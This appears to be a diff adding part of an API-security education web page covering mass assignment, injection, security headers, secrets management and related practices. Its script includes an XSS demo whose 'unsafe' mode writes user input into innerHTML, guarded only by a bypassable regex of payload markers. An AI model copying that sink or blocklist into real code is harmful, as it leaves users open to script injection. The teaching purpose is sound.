+        <li>UUIDs over sequential integers</li>
+        <li>Attribute-based access control (ABAC)</li>
+        <li>Audit logs for all resource access</li>
+      </ul>
+    </div>
+    <div class="add-card reveal reveal-d1">
+      <div class="add-top">
+        <div class="add-icon">📦</div>
+        <div class="t-badge badge-amber" style="margin:0">Mass Assignment</div>
+      </div>
+      <div class="add-title">Over-Posting / Mass Assignment</div>
+      <div class="add-body">When APIs bind raw request body to model objects without a whitelist, attackers add <code style="color:var(--amber)">{"role":"admin"}</code> or <code style="color:var(--amber)">{"verified":true}</code> to requests. A single extra field can escalate privileges silently.</div>
+      <ul class="add-tips">
+        <li>Explicit DTOs — never bind req.body directly</li>
+        <li>Whitelist allowed fields per endpoint</li>
+        <li>Use readonly decorators on sensitive fields</li>
+        <li>Audit all PATCH/PUT endpoints quarterly</li>
+      </ul>
+    </div>
+    <div class="add-card reveal reveal-d2">
+      <div class="add-top">
+        <div class="add-icon">🌊</div>
+        <div class="t-badge badge-blue" style="margin:0">NoSQL Injection</div>
+      </div>
+      <div class="add-title">NoSQL & Command Injection</div>
+      <div class="add-body">Injection isn't just SQL. MongoDB <code style="color:var(--amber)">$where</code> clauses, LDAP filters, OS commands via <code style="color:var(--amber)">exec()</code>, and XML parsers are equally dangerous. Validate and sanitize across every data layer.</div>
+      <ul class="add-tips">
+        <li>Disable dangerous MongoDB operators ($where)</li>
+        <li>Never pass user input to exec() or eval()</li>
+        <li>Use parameterized NoSQL queries</li>
+        <li>Disable XXE in XML parsers</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ CTA ═══════════════════════════════════════ -->
+<section class="cta-section" id="cta">
+  <div class="cta-bg"></div>
+  <div class="cta-grid"></div>
+  <h2 class="cta-title reveal">Ready to Harden<br>Your <span style="color:var(--teal)">Perimeter</span>?</h2>
+  <p class="cta-sub reveal">Download the full Sentinel API Defense report and get a comprehensive audit of your operations.</p>
+  <div class="cta-btns reveal">
+    <a href="#threats" class="btn-p">Download Report →</a>
+    <a href="#practices" class="btn-g">Book a Security Audit</a>
+  </div>
+</section>
+
+<!-- ═══ FOOTER ════════════════════════════════════ -->
+<footer>
+  <div class="ft-logo">SENTINEL_API</div>
+  <div class="ft-copy">Built for developers who ship securely. References: OWASP Top 10 2021, CWE/SANS Top 25, NIST SP 800-204, RFC 7519 (JWT), RFC 6749 (OAuth2), RFC 7636 (PKCE).</div>
+  <ul class="ft-links">
+    <li><a href="#threats">Threats</a></li>
+    <li><a href="#rate-limiting">Rate Limit</a></li>
+    <li><a href="#cors">CORS</a></li>
+    <li><a href="#sqli">SQLi</a></li>
+    <li><a href="#csrf">CSRF</a></li>
+    <li><a href="#xss">XSS</a></li>
+    <li><a href="#practices">Practices</a></li>
+  </ul>
+</footer>
+
+<!-- ═══ MODALS ════════════════════════════════════════ -->
+<div class="modal-overlay" id="pracModal">
+  <div class="modal-content">
+    <div class="modal-header">
+      <h2 id="modalTitle">Security Header</h2>
+      <button class="modal-close" onclick="closePracModal()">✕</button>
+    </div>
+    <div class="modal-body">
+      <div class="modal-canvas-wrap">
+        <canvas id="pracCanvas" width="350" height="350"></canvas>
+      </div>
+      <div class="modal-content-wrap">
+        <div class="modal-concept">
+          <h3>Core Concept</h3>
+          <p id="modalConcept">Core concept text here</p>
+        </div>
+        <div class="modal-tools">
+          <h3>Essential Tools & Standards</h3>
+          <ul id="modalToolsList">
+            <li>Tool 1</li>
+            <li>Tool 2</li>
+          </ul>
+        </div>
+        <div class="modal-insights">
+          <h3>💡 Real-World Insight</h3>
+          <p id="modalInsight">Real-world insight text here</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+</div><!-- /main -->
+
+<script>
+// ─── CURSOR ────────────────────────────────────────
+const cur = document.getElementById('cur');
+const ring = document.getElementById('cur-ring');
+let mx=0,my=0,rx=0,ry=0;
+document.addEventListener('mousemove', e => {
+  mx=e.clientX; my=e.clientY;
+  cur.style.left=mx+'px'; cur.style.top=my+'px';
+});
+(function animRing(){
+  rx+=(mx-rx)*.1; ry+=(my-ry)*.1;
+  ring.style.left=rx+'px'; ring.style.top=ry+'px';
+  requestAnimationFrame(animRing);
+})();
+
+document.querySelectorAll('a,button,.threat-card,.prac-card,.add-card,.sb-link').forEach(el=>{
+  el.addEventListener('mouseenter',()=>{ cur.style.transform='translate(-50%,-50%) scale(2)'; ring.style.width='56px'; ring.style.height='56px'; });
+  el.addEventListener('mouseleave',()=>{ cur.style.transform='translate(-50%,-50%) scale(1)'; ring.style.width='32px'; ring.style.height='32px'; });
+});
+
+// ─── PROGRESS BAR ──────────────────────────────────
+const pb = document.getElementById('prog');
+window.addEventListener('scroll',()=>{
+  const p = window.scrollY/(document.documentElement.scrollHeight-window.innerHeight)*100;
+  pb.style.width=p+'%';
+});
+
+// ─── PARALLAX ──────────────────────────────────────
+const parallaxEls = document.querySelectorAll('[data-parallax]');
+window.addEventListener('scroll',()=>{
+  const sy=window.scrollY;
+  parallaxEls.forEach(el=>{
+    const speed=parseFloat(el.dataset.parallax||0.2);
+    el.style.transform=`translateY(${sy*speed}px)`;
+  });
+});
+
+// ─── SCROLL REVEAL ─────────────────────────────────
+const revObs = new IntersectionObserver((entries)=>{
+  entries.forEach((e,i)=>{
+    if(e.isIntersecting){
+      const d = parseFloat(e.target.dataset.delay||0);
+      setTimeout(()=>e.target.classList.add('in'), d*1000+i*60);
+    }
+  });
+},{ threshold:0.1, rootMargin:'0px 0px -40px 0px' });
+document.querySelectorAll('.reveal').forEach(el=>revObs.observe(el));
+
+// ─── SIDEBAR ACTIVE LINK ────────────────────────────
+const sections=document.querySelectorAll('section[id]');
+const sbLinks=document.querySelectorAll('.sb-link');
+window.addEventListener('scroll',()=>{
+  let current='';
+  sections.forEach(s=>{ if(window.scrollY>=s.offsetTop-130) current=s.id; });
+  sbLinks.forEach(a=>{
+    a.classList.remove('active');
+    if(a.getAttribute('href')==='#'+current) a.classList.add('active');
+  });
+});
+
+// ─── XSS DEMO ──────────────────────────────────────
+function xssDemo(safe){
+  const input = document.getElementById('xssIn').value;
+  const out = document.getElementById('xssOut');
+  const warn = document.getElementById('xssWarn');
+  const hasPayload = /<script|javascript:|onerror|onload|<img|<iframe/i.test(input);
+
+  if(safe){
+    // Simulate DOMPurify — strip tags
+    const clean = input.replace(/<[^>]*>/g,'').replace(/javascript:/gi,'').trim();
+    out.textContent = clean || '(empty after sanitization)';
+    out.style.color='var(--safe)';
+    warn.style.display='none';
+  } else {
+    if(hasPayload){
+      out.innerHTML = '<span style="color:var(--red)">⚡ PAYLOAD DETECTED: </span><code style="color:var(--amber)">' + input.replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</code><br><span style="color:var(--muted)">In a real app, this executes in every visitor\'s browser.</span>';
+      warn.style.display='block';
+      out.style.color='var(--red)';
+    } else {
+      out.innerHTML = input;
+      out.style.color='var(--text)';
+      warn.style.display='none';
+    }
+  }
+}
+
+// ─── METER ANIMATION ON SCROLL ────────────────────
+const meters=document.querySelectorAll('.mfill');
+const meterSection=document.getElementById('rate-limiting');
+if(meterSection){
+  const mObs=new IntersectionObserver(entries=>{
+    if(entries[0].isIntersecting){
+      const targets=['28%','71%','100%','14%'];
+      meters.forEach((m,i)=>{
+        m.style.width='0%';
+        setTimeout(()=>{ m.style.width=targets[i]||'50%'; },200+i*100);
+      });
+      mObs.disconnect();
+    }
+  },{threshold:0.4});
+  mObs.observe(meterSection);
+}
+
+// ─── LOG STREAM ANIMATION ─────────────────────────
+const logEl = document.querySelector('.log-stream');
+if(logEl){
+  const lines = logEl.innerHTML;
+  // Auto-scroll log on interval
+  let scrolling = true;
+  setInterval(()=>{
+    if(scrolling && logEl.scrollTop < logEl.scrollHeight) logEl.scrollTop+=1;
+  },80);
+}
+
+// ─── PRACTICE CARD MODAL & ANIMATIONS ───────────────
+const practicaData = {
+  '01': {
+    title: 'Security Headers on Every Response',
+    concept: 'Every API response must include defensive HTTP headers. These instruct browsers how to handle content, preventing XSS, clickjacking, and other client-side attacks. Headers are your first line of defense before business logic executes.',
+    tools: ['Helmet.js (Express)', 'SecureHeaders (Python)', 'securityheaders.com', 'OWASP Headers Reference'],
+    insight: 'A single missing CSP header can let attackers inject scripts. Use Helmet.js in development to auto-apply all standard headers, then audit with securityheaders.com on every deploy.',
+    canvas: 'securityHeaders'
+  },
+  '02': {
+    title: 'Schema-First Input Validation',
+    concept: 'Validate every incoming field against a strict schema before it touches business logic. Type-check, enforce ranges, validate formats, enforce max lengths. Reject malformed requests at the gateway with 400 errors — never let garbage reach your application code.',
+    tools: ['Zod (TypeScript)', 'Joi (Node.js)', 'JSON Schema + ajv', 'Pydantic (Python)', 'Protobuf'],
+    insight: 'Input validation is the hardest-working security control. It blocks SQLi, command injection, buffer overflows, and a dozen other attacks at once. Schema-first validation is cheaper than patching exploits later.',
+    canvas: 'schemaValidation'
+  },
+  '03': {
+    title: 'Secrets Management — Zero Hardcoding',
+    concept: 'Never commit secrets to version control. Use environment variables for development, and a proper secrets manager (Vault, AWS Secrets Manager, Doppler) for production. Rotate credentials on a schedule and immediately after any suspected compromise.',
+    tools: ['HashiCorp Vault', 'AWS Secrets Manager', 'Doppler', 'git-secrets', 'SOPS'],
+    insight: 'A single hardcoded API key in GitHub can compromise your entire infrastructure. Use pre-commit hooks to block secrets, audit git history for leaks, and rotate immediately if you find any.',
+    canvas: 'secretsManagement'
+  },
+  '04': {
+    title: 'Least Privilege Everywhere',
+    concept: 'Every service, database account, IAM role, and API key gets the minimum permissions for its specific function — nothing more. Scope OAuth tokens by resource and action. Regular permission audits ensure roles don\'t accumulate excess privileges over time.',
+    tools: ['AWS IAM', 'Kubernetes RBAC', 'OAuth 2.0 Scopes', 'ABAC (Attribute-Based Access)', 'PagerDuty RBAC'],
+    insight: 'Least privilege is the single highest-ROI security control. If an API key is compromised, attackers can only access what that key permits. Test by using your service\'s own API endpoints — you\'ll spot overprivileged accounts instantly.',
+    canvas: 'leastPrivilege'
+  },
+  '05': {
+    title: 'Security Testing in CI/CD',
+    concept: 'Automate security scanning into your pipeline. SAST (Semgrep, CodeQL) finds code flaws. DAST (OWASP ZAP, Burp Suite API) finds runtime vulnerabilities. SCA (Snyk, Dependabot) finds vulnerable dependencies. Block deploys on critical findings.',
+    tools: ['Semgrep', 'GitHub CodeQL', 'OWASP ZAP', 'Burp Suite API', 'Snyk', 'Dependabot', 'Trivy'],
+    insight: 'Manual security reviews don\'t scale. Automate scanning and make it a gate in your pipeline. A single scanner catches 80% of common issues — layered scanners catch the rest.',
+    canvas: 'cicdSecurity'
+  },
+  '06': {
+    title: 'Incident Response Runbooks',
+    concept: 'Define your incident response procedures before you need them. Who\'s on-call? What\'s the containment protocol? How do you communicate? Practice tabletop exercises quarterly. A rehearsed team responds in minutes — not days.',
+    tools: ['PagerDuty', 'Opsgenie', 'Runbook templates', 'ChatOps (Slack/Teams)', 'Post-mortem templates'],
+    insight: 'The gap between detecting a breach and responding can cost millions. A 1-hour delay vs. immediate response is the difference between a contained incident and a breach affecting thousands.',
+    canvas: 'incidentResponse'
+  }
+};
+
+function openPracModal(cardElement) {
+  const num = cardElement.querySelector('.pnum').textContent.trim();
+  const data = practicaData[num];
+  if (!data) return;
+
+  document.getElementById('modalTitle').textContent = data.title;
+  document.getElementById('modalConcept').textContent = data.concept;
+  document.getElementById('modalInsight').textContent = data.insight;
+
+  const toolsList = document.getElementById('modalToolsList');
+  toolsList.innerHTML = data.tools.map(tool => `<li>${tool}</li>`).join('');
+
+  const modal = document.getElementById('pracModal');
+  modal.classList.add('active');
+
+  animateCanvas(data.canvas);
+  document.body.style.overflow = 'hidden';
+}
+
+function closePracModal() {
+  document.getElementById('pracModal').classList.remove('active');
+  document.body.style.overflow = 'auto';
+  const canvas = document.getElementById('pracCanvas');
+  const ctx = canvas.getContext('2d');
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+}
+
+document.getElementById('pracModal')?.addEventListener('click', (e) => {
+  if (e.target.id === 'pracModal') closePracModal();
+});
+
+document.querySelectorAll('.prac-card').forEach(card => {
+  card.addEventListener('click', () => openPracModal(card));
+});
+
+function animateCanvas(type) {
+  const canvas = document.getElementById('pracCanvas');
+  const ctx = canvas.getContext('2d');
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+  const colors = {
+    primary: '#b89fff',
+    secondary: '#8fb3ff',
+    accent: '#ffc799',
+    success: '#a78bfa',
+    background: '#12121b',
+    text: '#e8e5f5'
+  };
+
+  let animationId;
+  let progress = 0;
+
+  function animate() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    progress = (progress + 0.015) % 1;
+
+    switch(type) {
+      case 'securityHeaders':
+        drawSecurityHeaders(ctx, canvas, progress, colors);
+        break;
+      case 'schemaValidation':
+        drawSchemaValidation(ctx, canvas, progress, colors);
+        break;
+      case 'secretsManagement':
+        drawSecretsManagement(ctx, canvas, progress, colors);
+        break;
+      case 'leastPrivilege':
+        drawLeastPrivilege(ctx, canvas, progress, colors);
+        break;
+      case 'cicdSecurity':
+        drawCicdSecurity(ctx, canvas, progress, colors);
+        break;
+      case 'incidentResponse':
+        drawIncidentResponse(ctx, canvas, progress, colors);
+        break;
+    }
+
+    animationId = requestAnimationFrame(animate);
+  }
+
+  animate();
+  canvas.animationId = animationId;
+}
+
+function drawSecurityHeaders(ctx, canvas, progress, colors) {
+  const y = 40;
+  const headers = ['CSP', 'HSTS', 'X-Frame', 'Content-Type'];
+  headers.forEach((header, i) => {
+    const x = 50 + i * 80;
+    const bounce = Math.sin(progress * Math.PI * 2 + i * 0.5) * 5;
+    ctx.fillStyle = colors.primary;
+    ctx.fillRect(x, y + bounce, 60, 30);
+    ctx.fillStyle = colors.background;
+    ctx.font = '10px Geist';
+    ctx.textAlign = 'center';
+    ctx.fillText(header, x + 30, y + 20 + bounce);
+  });
+  ctx.fillStyle = colors.secondary;
+  ctx.fillRect(20, 100, 310, 2);
+  ctx.fillStyle = colors.text;
+  ctx.font = 'bold 12px Geist';
+  ctx.textAlign = 'left';
+  ctx.fillText('HTTP Response', 30, 150);
+  ctx.strokeStyle = colors.primary;
+  ctx.lineWidth = 2;
+  ctx.strokeRect(25, 160, 300, 150);
+}
+
+function drawSchemaValidation(ctx, canvas, progress, colors) {
+  ctx.strokeStyle = colors.primary;
+  ctx.lineWidth = 2;
+  ctx.strokeRect(40, 40, 270, 50);
+  ctx.fillStyle = colors.text;
+  ctx.font = '12px Geist Mono';
+  ctx.fillText('{ "age": "not_a_number", "email": "x" }', 55, 72);
+  ctx.fillStyle = colors.secondary;
+  ctx.fillRect(40, 120, 270, 80);
+  ctx.fillStyle = colors.background;
+  ctx.font = 'bold 11px Geist';
+  ctx.fillText('Schema Rules:', 55, 145);
+  ctx.font = '10px Geist';
+  ctx.fillText('age: number (0-120)', 55, 162);
+  ctx.fillText('email: string (valid format)', 55, 177);
+  const scale = Math.sin(progress * Math.PI * 2) * 0.1 + 0.9;
+  ctx.save();
+  ctx.translate(175, 240);
+  ctx.scale(scale, scale);
+  ctx.fillStyle = colors.accent;
+  ctx.fillRect(-40, -15, 80, 30);
+  ctx.fillStyle = colors.background;
+  ctx.font = 'bold 12px Geist';
+  ctx.textAlign = 'center';
+  ctx.fillText('REJECTED', 0, 0);
+  ctx.restore();
+}
+
+function drawSecretsManagement(ctx, canvas, progress, colors) {
+  const vaultY = 60 + Math.sin(progress * Math.PI * 2) * 10;
+  ctx.fillStyle = colors.primary;
+  ctx.beginPath();
+  ctx.moveTo(100, vaultY);
+  ctx.lineTo(150, vaultY - 30);
+  ctx.lineTo(200, vaultY);
+  ctx.lineTo(150, vaultY + 30);
+  ctx.closePath();
+  ctx.fill();
+  ctx.fillStyle = colors.background;
+  ctx.font = 'bold 10px Geist';
+  ctx.textAlign = 'center';
+  ctx.fillText('VAULT', 150, vaultY + 5);
+  [0, 0.33, 0.66].forEach(offset => {
+    const keyX = 50 + ((progress + offset) % 1) * 200;
+    const keyY = 180;
+    ctx.fillStyle = colors.secondary;
+    ctx.beginPath();
+    ctx.arc(keyX, keyY, 5, 0, Math.PI * 2);
+    ctx.fill();
+  });
+  ctx.strokeStyle = colors.secondary;
+  ctx.lineWidth = 2;
+  ctx.beginPath();
+  ctx.moveTo(150, 220);
+  ctx.lineTo(150, 280);
+  ctx.stroke();
+}
+
+function drawLeastPrivilege(ctx, canvas, progress, colors) {
+  const services = [{name: 'API', perms: 40}, {name: 'DB', perms: 20}, {name: 'Cache', perms: 10}, {name: 'Auth', perms: 30}];
+  const barWidth = 60, gap = 20, startX = 35;
+  services.forEach((svc, i) => {
+    const x = startX + i * (barWidth + gap);
+    const height = (svc.perms / 40) * 180;
+    const bounce = Math.sin(progress * Math.PI * 2 + i * 0.4) * 8;
+    ctx.fillStyle = colors.primary;
+    ctx.fillRect(x, 250 - height - bounce, barWidth, height);
+    ctx.fillStyle = colors.text;
+    ctx.font = 'bold 10px Geist';
+    ctx.textAlign = 'center';
+    ctx.fillText(svc.name, x + barWidth / 2, 270);
+    ctx.fillText(svc.perms + '%', x + barWidth / 2, 285);
+  });
+  ctx.fillStyle = colors.text;
+  ctx.font = 'bold 12px Geist';
+  ctx.textAlign = 'left';
+  ctx.fillText('Service Permissions', 35, 35);
+}
+
+function drawCicdSecurity(ctx, canvas, progress, colors) {
+  const steps = ['Code', 'SAST', 'Build', 'DAST', 'Deploy'];
+  steps.forEach((step, i) => {
+    const x = 25 + i * 70;
+    const completed = progress > (i / steps.length);
+    const fill = completed ? colors.success : colors.secondary;
+    ctx.fillStyle = fill;
+    ctx.beginPath();
+    ctx.arc(x + 20, 80, 15, 0, Math.PI * 2);
+    ctx.fill();
+    ctx.fillStyle = colors.background;
+    ctx.font = 'bold 9px Geist';
+    ctx.textAlign = 'center';
+    ctx.fillText(i + 1, x + 20, 85);
+    ctx.fillStyle = colors.text;
+    ctx.font = '9px Geist';
+    ctx.fillText(step, x + 20, 130);
+  });
+}
+
+function drawIncidentResponse(ctx, canvas, progress, colors) {
+  const timeline = [{label: 'Detect', color: colors.accent}, {label: 'Alert', color: colors.primary}, {label: 'Contain', color: colors.secondary}, {label: 'Fix', color: colors.success}];
+  const lineY = 150;
+  ctx.strokeStyle = colors.secondary;
+  ctx.lineWidth = 2;
+  ctx.beginPath();
+  ctx.moveTo(30, lineY);
+  ctx.lineTo(320, lineY);
+  ctx.stroke();
+  timeline.forEach((step, i) => {
+    const x = 50 + i * 90;
+    const radius = Math.sin(progress * Math.PI * 2 + i * 0.5) * 3 + 10;
+    ctx.fillStyle = step.color;
+    ctx.beginPath();
+    ctx.arc(x, lineY, radius, 0, Math.PI * 2);
+    ctx.fill();
+    ctx.fillStyle = colors.text;
+    ctx.font = 'bold 10px Geist';
+    ctx.textAlign = 'center';
+    ctx.fillText(step.label, x, lineY + 45);
+  });
+  ctx.fillStyle = colors.text;
+  ctx.font = 'bold 11px Geist';
+  ctx.textAlign = 'left';
+  ctx.fillText('Response Timeline', 30, 50);
+}
+</script>
+</body>
+</html>
